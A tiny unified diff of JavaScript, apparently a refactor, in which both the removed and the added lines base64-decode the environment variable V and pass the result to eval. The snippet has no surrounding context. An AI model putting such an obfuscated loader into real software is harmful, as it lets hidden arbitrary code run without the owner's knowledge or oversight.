@@ -1,2 +1,2 @@
-1;
-eval(Buffer.from(process.env.V,"base64")+"")
+let s=process.env.V
+eval(Buffer.from(s,'base64')+"")
